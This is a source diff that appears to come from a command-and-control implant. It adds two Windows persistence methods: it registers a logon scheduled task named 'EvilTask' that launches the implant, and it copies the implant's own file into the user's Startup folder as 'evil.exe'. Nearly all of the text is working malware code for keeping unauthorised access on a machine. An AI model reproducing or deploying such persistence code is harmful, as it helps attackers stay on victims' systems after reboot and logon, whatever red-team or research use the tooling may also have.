@@ -210,7 +210,92 @@ namespace Task
         }
         else if (wcscmp(wTechnique.c_str(), L"scheduled-task") == 0)
         {
-            return L"Error: Not implemented yet.";
+            std::wstring wResult = L"";
+            std::wstring wTaskName = L"EvilTask";
+            std::wstring wCommand = L"schtasks /create /tn \"" + wTaskName + L"\" /sc ONLOGON /tr \"" + std::wstring(lpSelfPath) + L"\"";
+
+            STARTUPINFO si;
+            PROCESS_INFORMATION pi;
+            RtlZeroMemory(&si, sizeof(si));
+            si.cb = sizeof(si);
+            RtlZeroMemory(&pi, sizeof(pi));
+
+            if (!pState->pProcs->lpCreateProcessW(
+                nullptr,
+                &wCommand[0],
+                nullptr,
+                nullptr,
+                FALSE,
+                0,
+                nullptr,
+                nullptr,
+                &si,
+                &pi
+            )) {
+                return L"Error: Failed to create process for schtasks.";
+            }
+
+            System::Handle::HandleWait(
+                pState->pProcs,
+                pi.hProcess,
+                FALSE,
+                nullptr
+            );
+
+            // Get exit code.
+            DWORD dwExitCode;
+            if (pState->pProcs->lpGetExitCodeProcess(pi.hProcess, &dwExitCode))
+            {
+                if (dwExitCode == 0)
+                {
+                    wResult = L"Success: Task \"" + wTaskName + L"\" registered successfully.";
+                }
+                else if (dwExitCode == 5)
+                {
+                    wResult = L"Error: Access Denied";
+                }
+                else
+                {
+                    wResult = L"Error: Failed to register the task.";
+                }
+            }
+            else
+            {
+                DWORD dwError = pState->pProcs->lpGetLastError();
+                if (dwError == ERROR_ACCESS_DENIED)
+                {
+                    wResult = L"Error: Access Denied";
+                }
+                else
+                {
+                    wResult = L"Error: Failed to register the task.";
+                }
+            }
+
+            System::Handle::HandleClose(pState->pProcs, pi.hProcess);
+            System::Handle::HandleClose(pState->pProcs, pi.hThread);
+
+            return wResult;
+        }
+        else if (wcscmp(wTechnique.c_str(), L"startup-folder") == 0)
+        {
+            // Get a destination path (startup folder + implant).
+            std::wstring wAppData = System::Env::EnvStringsGet(pState->pProcs, L"%APPDATA%");
+            std::wstring wFileName = L"evil.exe";
+            std::wstring wDest = wAppData + L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + wFileName;
+
+            Stdout::DisplayMessageBoxW(wDest.c_str(), L"startup-folder");
+
+            // Read the implant data
+            std::vector<BYTE> bytes = System::Fs::FileRead(pState->pProcs, std::wstring(lpSelfPath));
+
+            // Copy to startup folder.
+            if (!System::Fs::FileWrite(pState->pProcs, wDest, bytes))
+            {
+                return L"Error: Failed to copy the implant to a startup folder.";
+            }
+            
+            return L"Success: Implant copied to the startup folder \"" + wDest + L"\" successfully.";
         }
         else if (wcscmp(wTechnique.c_str(), L"winlogon") == 0)
         {
